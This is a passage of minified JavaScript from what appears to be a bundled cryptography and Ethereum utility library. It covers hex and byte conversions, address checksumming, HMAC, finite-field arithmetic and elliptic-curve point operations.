"+c)};for(const[i,s]of Object.entries(e))r(i,s,!1);for(const[i,s]of Object.entries(n))r(i,s,!0);return t}function wz(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const s=t(n,...r);return e.set(n,s),s}}function Y_e(t,e){if(Az(t)>e)throw new yAe({givenSize:Az(t),maxSize:e})}const jd={zero:48,nine:57,A:65,F:70,a:97,f:102};function vz(t){if(t>=jd.zero&&t<=jd.nine)return t-jd.zero;if(t>=jd.A&&t<=jd.F)return t-(jd.A-10);if(t>=jd.a&&t<=jd.f)return t-(jd.a-10)}function Q_e(t,e={}){const{dir:n,size:r=32}=e;if(r===0)return t;if(t.length>r)throw new bAe({size:t.length,targetSize:r,type:"Bytes"});const i=new Uint8Array(r);for(let s=0;s<r;s++){const o=n==="right";i[o?s:r-s-1]=t[o?s:t.length-s-1]}return i}function zie(t,e){if(Np(t)>e)throw new aAe({givenSize:Np(t),maxSize:e})}function J_e(t,e){if(typeof e=="number"&&e>0&&e>Np(t)-1)throw new Wie({offset:e,position:"start",size:Np(t)})}function X_e(t,e,n){if(typeof e=="number"&&typeof n=="number"&&Np(t)!==n-e)throw new Wie({offset:n,position:"end",size:Np(t)})}function qie(t,e={}){const{dir:n,size:r=32}=e;if(r===0)return t;const i=t.replace("0x","");if(i.length>r*2)throw new cAe({size:Math.ceil(i.length/2),targetSize:r,type:"Hex"});return`0x${i[n==="right"?"padEnd":"padStart"](r*2,"0")}`}const eAe="#__bigint";function bB(t,e,n){return JSON.stringify(t,(r,i)=>typeof i=="bigint"?i.toString()+eAe:i,n)}const tAe=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function nAe(t,e={}){const{strict:n=!1}=e;if(!t)throw new Ez(t);if(typeof t!="string")throw new Ez(t);if(n&&!/^0x[0-9a-fA-F]*$/.test(t))throw new _z(t);if(!t.startsWith("0x"))throw new _z(t)}function rAe(...t){return`0x${t.reduce((e,n)=>e+n.replace("0x",""),"")}`}function wB(t){return t instanceof Uint8Array?Sx(t):Array.isArray(t)?Sx(new Uint8Array(t)):t}function Sx(t,e={}){let n="";for(let i=0;i<t.length;i++)n+=tAe[t[i]];const r=`0x${n}`;return typeof e.size=="number"?(zie(r,e.size),Vie(r,e.size)):r}function e9(t,e={}){const{signed:n,size:r}=e,i=BigInt(t);let s;r?n?s=(1n<<BigInt(r)*8n-1n)-1n:s=2n**(BigInt(r)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&n?-s-1n:0;if(s&&i>s||i<o){const l=typeof t=="bigint"?"n":"";throw new oAe({max:s?`${s}${l}`:void 0,min:`${o}${l}`,signed:n,size:r,value:`${t}${l}`})}const c=`0x${(n&&i<0?(1n<<BigInt(r*8))+BigInt(i):i).toString(16)}`;return r?iAe(c,r):c}function iAe(t,e){return qie(t,{dir:"left",size:e})}function Vie(t,e){return qie(t,{dir:"right",size:e})}function cf(t,e,n,r={}){const{strict:i}=r;J_e(t,e);const s=`0x${t.replace("0x","").slice((e??0)*2,(n??t.length)*2)}`;return i&&X_e(s,e,n),s}function Np(t){return Math.ceil((t.length-2)/2)}function sAe(t,e={}){const{strict:n=!1}=e;try{return nAe(t,{strict:n}),!0}catch{return!1}}class oAe extends Fr{constructor({max:e,min:n,signed:r,size:i,value:s}){super(`Number \`${s}\` is not in safe${i?` ${i*8}-bit`:""}${r?" signed":" unsigned"} integer range ${e?`(\`${n}\` to \`${e}\`)`:`(above \`${n}\`)`}`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.IntegerOutOfRangeError"})}}class Ez extends Fr{constructor(e){super(`Value \`${typeof e=="object"?bB(e):e}\` of type \`${typeof e}\` is an invalid hex type.`,{metaMessages:['Hex types must be represented as `"0x${string}"`.']}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidHexTypeError"})}}class _z extends Fr{constructor(e){super(`Value \`${e}\` is an invalid hex value.`,{metaMessages:['Hex values must start with `"0x"` and contain only hexadecimal characters (0-9, a-f, A-F).']}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidHexValueError"})}}let aAe=class extends Fr{constructor({givenSize:e,maxSize:n}){super(`Size cannot exceed \`${n}\` bytes. Given size: \`${e}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeOverflowError"})}};class Wie extends Fr{constructor({offset:e,position:n,size:r}){super(`Slice ${n==="start"?"starting":"ending"} at offset \`${e}\` is out-of-bounds (size: \`${r}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SliceOffsetOutOfBoundsError"})}}let cAe=class extends Fr{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (\`${e}\`) exceeds padding size (\`${n}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeExceedsPaddingSizeError"})}};const uAe=new TextEncoder;function lAe(t){if(!(t instanceof Uint8Array)){if(!t)throw new $3(t);if(typeof t!="object")throw new $3(t);if(!("BYTES_PER_ELEMENT"in t))throw new $3(t);if(t.BYTES_PER_ELEMENT!==1||t.constructor.name!=="Uint8Array")throw new $3(t)}}function dAe(t){return t instanceof Uint8Array?t:typeof t=="string"?hAe(t):fAe(t)}function fAe(t){return t instanceof Uint8Array?t:new Uint8Array(t)}function hAe(t,e={}){const{size:n}=e;let r=t;n&&(zie(t,n),r=Vie(t,n));let i=r.slice(2);i.length%2&&(i=`0${i}`);const s=i.length/2,o=new Uint8Array(s);for(let a=0,c=0;a<s;a++){const l=vz(i.charCodeAt(c++)),f=vz(i.charCodeAt(c++));if(l===void 0||f===void 0)throw new Fr(`Invalid byte sequence ("${i[c-2]}${i[c-1]}" in "${i}").`);o[a]=l*16+f}return o}function pAe(t,e={}){const{size:n}=e,r=uAe.encode(t);return typeof n=="number"?(Y_e(r,n),mAe(r,n)):r}function mAe(t,e){return Q_e(t,{dir:"right",size:e})}function Az(t){return t.length}function gAe(t){try{return lAe(t),!0}catch{return!1}}class $3 extends Fr{constructor(e){super(`Value \`${typeof e=="object"?bB(e):e}\` of type \`${typeof e}\` is an invalid Bytes value.`,{metaMessages:["Bytes values must be of type `Bytes`."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.InvalidBytesTypeError"})}}class yAe extends Fr{constructor({givenSize:e,maxSize:n}){super(`Size cannot exceed \`${n}\` bytes. Given size: \`${e}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeOverflowError"})}}class bAe extends Fr{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (\`${e}\`) exceeds padding size (\`${n}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeExceedsPaddingSizeError"})}}function Gie(t,e={}){const{as:n=typeof t=="string"?"Hex":"Bytes"}=e,r=H_e(dAe(t));return n==="Bytes"?r:Sx(r)}class wAe extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const n=super.get(e);return super.has(e)&&n!==void 0&&(this.delete(e),super.set(e,n)),n}set(e,n){if(super.set(e,n),this.maxSize&&this.size>this.maxSize){const r=this.keys().next().value;r&&this.delete(r)}return this}}const vAe={checksum:new wAe(8192)},t9=vAe.checksum;function Kie(t,e={}){const{compressed:n}=e,{prefix:r,x:i,y:s}=t;if(n===!1||typeof i=="bigint"&&typeof s=="bigint"){if(r!==4)throw new Cz({prefix:r,cause:new TAe});return}if(n===!0||typeof i=="bigint"&&typeof s>"u"){if(r!==3&&r!==2)throw new Cz({prefix:r,cause:new SAe});return}throw new CAe({publicKey:t})}function EAe(t){const e=(()=>{if(sAe(t))return Zie(t);if(gAe(t))return _Ae(t);const{prefix:n,x:r,y:i}=t;return typeof r=="bigint"&&typeof i=="bigint"?{prefix:n??4,x:r,y:i}:{prefix:n,x:r}})();return Kie(e),e}function _Ae(t){return Zie(Sx(t))}function Zie(t){if(t.length!==132&&t.length!==130&&t.length!==68)throw new xAe({publicKey:t});if(t.length===130){const r=BigInt(cf(t,0,32)),i=BigInt(cf(t,32,64));return{prefix:4,x:r,y:i}}if(t.length===132){const r=Number(cf(t,0,1)),i=BigInt(cf(t,1,33)),s=BigInt(cf(t,33,65));return{prefix:r,x:i,y:s}}const e=Number(cf(t,0,1)),n=BigInt(cf(t,1,33));return{prefix:e,x:n}}function AAe(t,e={}){Kie(t);const{prefix:n,x:r,y:i}=t,{includePrefix:s=!0}=e;return rAe(s?e9(n,{size:1}):"0x",e9(r,{size:32}),typeof i=="bigint"?e9(i,{size:32}):"0x")}class CAe extends Fr{constructor({publicKey:e}){super(`Value \`${bB(e)}\` is not a valid public key.`,{metaMessages:["Public key must contain:","- an `x` and `prefix` value (compressed)","- an `x`, `y`, and `prefix` value (uncompressed)"]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidError"})}}class Cz extends Fr{constructor({prefix:e,cause:n}){super(`Prefix "${e}" is invalid.`,{cause:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidPrefixError"})}}class SAe extends Fr{constructor(){super("Prefix must be 2 or 3 for compressed public keys."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidCompressedPrefixError"})}}class TAe extends Fr{constructor(){super("Prefix must be 4 for uncompressed public keys."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidUncompressedPrefixError"})}}let xAe=class extends Fr{constructor({publicKey:e}){super(`Value \`${e}\` is an invalid public key size.`,{metaMessages:["Expected: 33 bytes (compressed + prefix), 64 bytes (uncompressed) or 65 bytes (uncompressed + prefix).",`Received ${Np(wB(e))} bytes.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidSerializedSizeError"})}};const IAe=/^0x[a-fA-F0-9]{40}$/;function Yie(t,e={}){const{strict:n=!0}=e;if(!IAe.test(t))throw new Sz({address:t,cause:new NAe});if(n){if(t.toLowerCase()===t)return;if(Qie(t)!==t)throw new Sz({address:t,cause:new OAe})}}function Qie(t){if(t9.has(t))return t9.get(t);Yie(t,{strict:!1});const e=t.substring(2).toLowerCase(),n=Gie(pAe(e),{as:"Bytes"}),r=e.split("");for(let s=0;s<40;s+=2)n[s>>1]>>4>=8&&r[s]&&(r[s]=r[s].toUpperCase()),(n[s>>1]&15)>=8&&r[s+1]&&(r[s+1]=r[s+1].toUpperCase());const i=`0x${r.join("")}`;return t9.set(t,i),i}function RAe(t,e={}){const{checksum:n=!1}=e;return Yie(t),n?Qie(t):t}function PAe(t,e={}){const n=Gie(`0x${AAe(t).slice(4)}`).substring(26);return RAe(`0x${n}`,e)}class Sz extends Fr{constructor({address:e,cause:n}){super(`Address "${e}" is invalid.`,{cause:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidAddressError"})}}class NAe extends Fr{constructor(){super("Address is not a 20 byte (40 hexadecimal character) value."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidInputError"})}}class OAe extends Fr{constructor(){super("Address does not match its checksum counterpart."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidChecksumError"})}}let Jie=class extends pB{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,p_e(e);const r=VI(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(r.length>i?e.create().update(r).digest():r);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),C1(s)}update(e){return A1(this),this.iHash.update(e),this}digestInto(e){A1(this),og(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}clone(){return this._cloneInto()}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const Xie=(t,e,n)=>new Jie(t,e).update(n).digest();Xie.create=(t,e)=>new Jie(t,e);const Xo=BigInt(0),bo=BigInt(1),Bm=BigInt(2),kAe=BigInt(3),ese=BigInt(4),tse=BigInt(5),nse=BigInt(8);function Ko(t,e){const n=t%e;return n>=Xo?n:e+n}function vc(t,e,n){let r=t;for(;e-- >Xo;)r*=r,r%=n;return r}function Qk(t,e){if(t===Xo)throw new Error("invert: expected non-zero number");if(e<=Xo)throw new Error("invert: expected positive modulus, got "+e);let n=Ko(t,e),r=e,i=Xo,s=bo;for(;n!==Xo;){const a=r/n,c=r%n,l=i-s*a;r=n,n=c,i=s,s=l}if(r!==bo)throw new Error("invert: does not exist");return Ko(i,e)}function rse(t,e){const n=(t.ORDER+bo)/ese,r=t.pow(e,n);if(!t.eql(t.sqr(r),e))throw new Error("Cannot find square root");return r}function DAe(t,e){const n=(t.ORDER-tse)/nse,r=t.mul(e,Bm),i=t.pow(r,n),s=t.mul(e,i),o=t.mul(t.mul(s,Bm),i),a=t.mul(s,t.sub(o,t.ONE));if(!t.eql(t.sqr(a),e))throw new Error("Cannot find square root");return a}function BAe(t){if(t<BigInt(3))throw new Error("sqrt is not defined for small field");let e=t-bo,n=0;for(;e%Bm===Xo;)e/=Bm,n++;let r=Bm;const i=vB(t);for(;Tz(i,r)===1;)if(r++>1e3)throw new Error("Cannot find square root: probably non-prime P");if(n===1)return rse;let s=i.pow(r,e);const o=(e+bo)/Bm;return function(c,l){if(c.is0(l))return l;if(Tz(c,l)!==1)throw new Error("Cannot find square root");let f=n,h=c.mul(c.ONE,s),m=c.pow(l,e),b=c.pow(l,o);for(;!c.eql(m,c.ONE);){if(c.is0(m))return c.ZERO;let w=1,y=c.sqr(m);for(;!c.eql(y,c.ONE);)if(w++,y=c.sqr(y),w===f)throw new Error("Cannot find square root");const E=bo<<BigInt(f-w-1),A=c.pow(h,E);f=w,h=c.sqr(A),m=c.mul(m,h),b=c.mul(b,A)}return b}}function jAe(t){return t%ese===kAe?rse:t%nse===tse?DAe:BAe(t)}const MAe=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function UAe(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=MAe.reduce((r,i)=>(r[i]="function",r),e);return GI(t,n)}function LAe(t,e,n){if(n<Xo)throw new Error("invalid exponent, negatives unsupported");if(n===Xo)return t.ONE;if(n===bo)return e;let r=t.ONE,i=e;for(;n>Xo;)n&bo&&(r=t.mul(r,i)),i=t.sqr(i),n>>=bo;return r}function ise(t,e,n=!1){const r=new Array(e.length).fill(n?t.ZERO:void 0),i=e.reduce((o,a,c)=>t.is0(a)?o:(r[c]=o,t.mul(o,a)),t.ONE),s=t.inv(i);return e.reduceRight((o,a,c)=>t.is0(a)?o:(r[c]=t.mul(o,r[c]),t.mul(o,a)),s),r}function Tz(t,e){const n=(t.ORDER-bo)/Bm,r=t.pow(e,n),i=t.eql(r,t.ONE),s=t.eql(r,t.ZERO),o=t.eql(r,t.neg(t.ONE));if(!i&&!s&&!o)throw new Error("invalid Legendre symbol result");return i?1:s?0:-1}function sse(t,e){e!==void 0&&s_(e);const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function vB(t,e,n=!1,r={}){if(t<=Xo)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=sse(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:s,MASK:WI(i),ZERO:Xo,ONE:bo,create:c=>Ko(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Xo<=c&&c<t},is0:c=>c===Xo,isOdd:c=>(c&bo)===bo,neg:c=>Ko(-c,t),eql:(c,l)=>c===l,sqr:c=>Ko(c*c,t),add:(c,l)=>Ko(c+l,t),sub:(c,l)=>Ko(c-l,t),mul:(c,l)=>Ko(c*l,t),pow:(c,l)=>LAe(a,c,l),div:(c,l)=>Ko(c*Qk(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>Qk(c,t),sqrt:r.sqrt||(c=>(o||(o=jAe(t)),o(a,c))),toBytes:c=>n?Hie(c,s):Q_(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return n?$ie(c):Ym(c)},invertBatch:c=>ise(a,c),cmov:(c,l,f)=>f?l:c});return Object.freeze(a)}function ose(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function ase(t){const e=ose(t);return e+Math.ceil(e/2)}function FAe(t,e,n=!1){const r=t.length,i=ose(e),s=ase(e);if(r<16||r<s||r>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+r);const o=n?$ie(t):Ym(t),a=Ko(o,e-bo)+bo;return n?Hie(a,i):Q_(a,i)}const xz=BigInt(0),Jk=BigInt(1);function n9(t,e){const n=e.negate();return t?n:e}function cse(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function r9(t,e){cse(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1),i=2**t,s=WI(t),o=BigInt(t);return{windows:n,windowSize:r,mask:s,maxNumber:i,shiftBy:o}}function Iz(t,e,n){const{windowSize:r,mask:i,maxNumber:s,shiftBy:o}=n;let a=Number(t&i),c=t>>o;a>r&&(a-=s,c+=Jk);const l=e*r,f=l+Math.abs(a)-1,h=a===0,m=a<0,b=e%2!==0;return{nextN:c,offset:f,isZero:h,isNeg:m,isNegF:b,offsetF:l}}function $Ae(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function HAe(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const i9=new WeakMap,use=new WeakMap;function s9(t){return use.get(t)||1}function zAe(t,e){return{constTimeNegate:n9,hasPrecomputes(n){return s9(n)!==1},unsafeLadder(n,r,i=t.ZERO){let s=n;for(;r>xz;)r&Jk&&(i=i.add(s)),s=s.double(),r>>=Jk;return i},precomputeWindow(n,r){const{windows:i,windowSize:s}=r9(r,e),o=[];let a=n,c=a;for(let l=0;l<i;l++){c=a,o.push(c);for(let f=1;f<s;f++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(n,r,i){let s=t.ZERO,o=t.BASE;const a=r9(n,e);for(let c=0;c<a.windows;c++){const{nextN:l,offset:f,isZero:h,isNeg:m,isNegF:b,offsetF:w}=Iz(i,c,a);i=l,h?o=o.add(n9(b,r[w])):s=s.add(n9(m,r[f]))}return{p:s,f:o}},wNAFUnsafe(n,r,i,s=t.ZERO){const o=r9(n,e);for(let a=0;a<o.windows&&i!==xz;a++){const{nextN:c,offset:l,isZero:f,isNeg:h}=Iz(i,a,o);if(i=c,!f){const m=r[l];s=s.add(h?m.negate():m)}}return s},getPrecomputes(n,r,i){let s=i9.get(r);return s||(s=this.precomputeWindow(r,n),n!==1&&i9.set(r,i(s))),s},wNAFCached(n,r,i){const s=s9(n);return this.wNAF(s,this.getPrecomputes(s,n,i),r)},wNAFCachedUnsafe(n,r,i,s){const o=s9(n);return o===1?this.unsafeLadder(n,r,s):this.wNAFUnsafe(o,this.getPrecomputes(o,n,i),r,s)},setWindowSize(n,r){cse(r,e),use.set(n,r),i9.delete(n)}}}function qAe(t,e,n,r){$Ae(n,t),HAe(r,e);const i=n.length,s=r.length;if(i!==s)throw new Error("arrays of points and scalars must have equal length");const o=t.ZERO,a=G_e(BigInt(i));let c=1;a>12?c=a-3:a>4?c=a-2:a>0&&(c=2);const l=WI(c),f=new Array(Number(l)+1).fill(o),h=Math.floor((e.BITS-1)/c)*c;let m=o;for(let b=h;b>=0;b-=c){f.fill(o);for(let y=0;y<s;y++){const E=r[y],A=Number(E>>BigInt(b)&l);f[A]=f[A].add(n[y])}let w=o;for(let y=f.length-1,E=o;y>0;y--)E=E.add(f[y]),w=w.add(E);if(m=m.add(w),b!==0)for(let y=0;y<c;y++)m=m.double()}return m}function lse(t){return UAe(t.Fp),GI(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...sse(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}function Rz(t){t.lowS!==void 0&&o_("lowS",t.lowS),t.prehash!==void 0&&o_("prehash",t.prehash)}function VAe(t){const e=lse(t);GI(e,{a:"field",b:"field"},{allowInfinityPoint:"boolean",allowedPrivateKeyLengths:"array",clearCofactor:"function",fromBytes:"function",isTorsionFree:"function",toBytes:"function",wrapPrivateKey:"boolean"});const{endo:n,Fp:r,a:i}=e;if(n){if(!r.eql(i,r.ZERO))throw new Error("invalid endo: CURVE.a must be 0");if(typeof n!="object"||typeof n.beta!="bigint"||typeof n.splitScalar!="function")throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function')}return Object.freeze({...e})}class WAe extends Error{constructor(e=""){super(e)}}const df={Err:WAe,_tlv:{encode:(t,e)=>{const{Err:n}=df;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length&1)throw new n("tlv.encode: unpadded data");const r=e.length/2,i=F3(r);if(i.length/2&128)throw new n("tlv.encode: long form length too big");const s=r>127?F3(i.length/2|128):"";return F3(t)+s+i+e},decode(t,e){const{Err:n}=df;let r=0;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length<2||e[r++]!==t)throw new n("tlv.decode: wrong tlv");const i=e[r++],s=!!(i&128);let o=0;if(!s)o=i;else{const c=i&127;if(!c)throw new n("tlv.decode(long): indefinite length not supported");if(c>4)throw new n("tlv.decode(long): byte length is too big");const l=e.subarray(r,r+c);if(l.length!==c)throw new n("tlv.decode: length bytes not complete");if(l[0]===0)throw new n("tlv.decode(long): zero leftmost byte");for(const f of l)o=o<<8|f;if(r+=c,o<128)throw new n("tlv.decode(long): not minimal encoding")}const a=e.subarray(r,r+o);if(a.length!==o)throw new n("tlv.decode: wrong value length");return{v:a,l:e.subarray(r+o)}}},_int:{encode(t){const{Err:e}=df;if(t<mf)throw new e("integer: negative integers are not allowed");let n=F3(t);if(Number.parseInt(n[0],16)&8&&(n="00"+n),n.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return n},decode(t){const{Err:e}=df;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return Ym(t)}},toSig(t){const{Err:e,_int:n,_tlv:r}=df,i=Rc("signature",t),{v:s,l:o}=r.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=r.decode(2,s),{v:l,l:f}=r.decode(2,c);if(f.length)throw new e("invalid signature: left bytes after parsing");return{r:n.decode(a),s:n.decode(l)}},hexFromSig(t){const{_tlv:e,_int:n}=df,r=e.encode(2,n.encode(t.r)),i=e.encode(2,n.encode(t.s)),s=r+i;return e.encode(48,s)}};function o9(t,e){return a_(Q_(t,e))}const mf=BigInt(0),Qi=BigInt(1);BigInt(2);const a9=BigInt(3),GAe=BigInt(4);function KAe(t){const e=VAe(t),{Fp:n}=e,r=vB(e.n,e.nBitLength),i=e.toBytes||((S,v,k)=>{const O=v.toAffine();return Cx(Uint8Array.from([4]),n.toBytes(O.x),n.toBytes(O.y))}),s=e.fromBytes||(S=>{const v=S.subarray(1),k=n.fromBytes(v.subarray(0,n.BYTES)),O=n.fromBytes(v.subarray(n.BYTES,2*n.BYTES));return{x:k,y:O}});function o(S){const{a:v,b:k}=e,O=n.sqr(S),_=n.mul(O,S);return n.add(n.add(_,n.mul(S,v)),k)}function a(S,v){const k=n.sqr(v),O=o(S);return n.eql(k,O)}if(!a(e.Gx,e.Gy))throw new Error("bad curve params: generator point");const c=n.mul(n.pow(e.a,a9),GAe),l=n.mul(n.sqr(e.b),BigInt(27));if(n.is0(n.add(c,l)))throw new Error("bad curve params: a or b");function f(S){return yB(S,Qi,e.n)}function h(S){const{allowedPrivateKeyLengths:v,nByteLength:k,wrapPrivateKey:O,n:_}=e;if(v&&typeof S!="bigint"){if(Y_(S)&&(S=a_(S)),typeof S!="string"||!v.includes(S.length))throw new Error("invalid private key");S=S.padStart(k*2,"0")}let I;try{I=typeof S=="bigint"?S:Ym(Rc("private key",S,k))}catch{throw new Error("invalid private key, expected hex or "+k+" bytes, got "+typeof S)}return O&&(I=Ko(I,_)),Xb("private key",I,Qi,_),I}function m(S){if(!(S instanceof y))throw new Error("ProjectivePoint expected")}const b=wz((S,v)=>{const{px:k,py:O,pz:_}=S;if(n.eql(_,n.ONE))return{x:k,y:O};const I=S.is0();v==null&&(v=I?n.ONE:n.inv(_));const T=n.mul(k,v),B=n.mul(O,v),U=n.mul(_,v);if(I)return{x:n.ZERO,y:n.ZERO};if(!n.eql(U,n.ONE))throw new Error("invZ was invalid");return{x:T,y:B}}),w=wz(S=>{if(S.is0()){if(e.allowInfinityPoint&&!n.is0(S.py))return;throw new Error("bad point: ZERO")}const{x:v,y:k}=S.toAffine();if(!n.isValid(v)||!n.isValid(k))throw new Error("bad point: x or y not FE");if(!a(v,k))throw new Error("bad point: equation left != right");if(!S.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class y{constructor(v,k,O){if(v==null||!n.isValid(v))throw new Error("x required");if(k==null||!n.isValid(k)||n.is0(k))throw new Error("y required");if(O==null||!n.isValid(O))throw new Error("z required");this.px=v,this.py=k,this.pz=O,Object.freeze(this)}static fromAffine(v){const{x:k,y:O}=v||{};if(!v||!n.isValid(k)||!n.isValid(O))throw new Error("invalid affine point");if(v instanceof y)throw new Error("projective point not allowed");const _=I=>n.eql(I,n.ZERO);return _(k)&&_(O)?y.ZERO:new y(k,O,n.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(v){const k=ise(n,v.map(O=>O.pz));return v.map((O,_)=>O.toAffine(k[_])).map(y.fromAffine)}static fromHex(v){const k=y.fromAffine(s(Rc("pointHex",v)));return k.assertValidity(),k}static fromPrivateKey(v){return y.BASE.multiply(h(v))}static msm(v,k){return qAe(y,r,v,k)}_setWindowSize(v){R.setWindowSize(this,v)}assertValidity(){w(this)}hasEvenY(){const{y:v}=this.toAffine();if(n.isOdd)return!n.isOdd(v);throw new Error("Field doesn't support isOdd")}equals(v){m(v);const{px:k,py:O,pz:_}=this,{px:I,py:T,pz:B}=v,U=n.eql(n.mul(k,B),n.mul(I,_)),M=n.eql(n.mul(O,B),n.mul(T,_));return U&&M}negate(){return new y(this.px,n.neg(this.py),this.pz)}double(){const{a:v,b:k}=e,O=n.mul(k,a9),{px:_,py:I,pz:T}=this;let B=n.ZERO,U=n.ZERO,M=n.ZERO,N=n.mul(_,_),q=n.mul(I,I),P=n.mul(T,T),C=n.mul(_,I);return C=n.add(C,C),M=n.mul(_,T),M=n.add(M,M),B=n.mul(v,M),U=n.mul(O,P),U=n.add(B,U),B=n.sub(q,U),U=n.add(q,U),U=n.mul(B,U),B=n.mul(C,B),M=n.mul(O,M),P=n.mul(v,P),C=n.sub(N,P),C=n.mul(v,C),C=n.add(C,M),M=n.add(N,N),N=n.add(M,N),N=n.add(N,P),N=n.mul(N,C),U=n.add(U,N),P=n.mul(I,T),P=n.add(P,P),N=n.mul(P,C),B=n.sub(B,N),M=n.mul(P,q),M=n.add(M,M),M=n.add(M,M),new y(B,U,M)}add(v){m(v);const{px:k,py:O,pz:_}=this,{px:I,py:T,pz:B}=v;let U=n.ZERO,M=n.ZERO,N=n.ZERO;const q=e.a,P=n.mul(e.b,a9);let C=n.mul(k,I),j=n.mul(O,T),z=n.mul(_,B),$=n.add(k,O),H=n.add(I,T);$=n.mul($,H),H=n.add(C,j),$=n.sub($,H),H=n.add(k,_);let L=n.add(I,B);return H=n.mul(H,L),L=n.add(C,z),H=n.sub(H,L),L=n.add(O,_),U=n.add(T,B),L=n.mul(L,U),U=n.add(j,z),L=n.sub(L,U),N=n.mul(q,H),U=n.mul(P,z),N=n.add(U,N),U=n.sub(j,N),N=n.add(j,N),M=n.mul(U,N),j=n.add(C,C),j=n.add(j,C),z=n.mul(q,z),H=n.mul(P,H),j=n.add(j,z),z=n.sub(C,z),z=n.mul(q,z),H=n.add(H,z),C=n.mul(j,H),M=n.add(M,C),C=n.mul(L,H),U=n.mul($,U),U=n.sub(U,C),C=n.mul($,j),N=n.mul(L,N),N=n.add(N,C),new 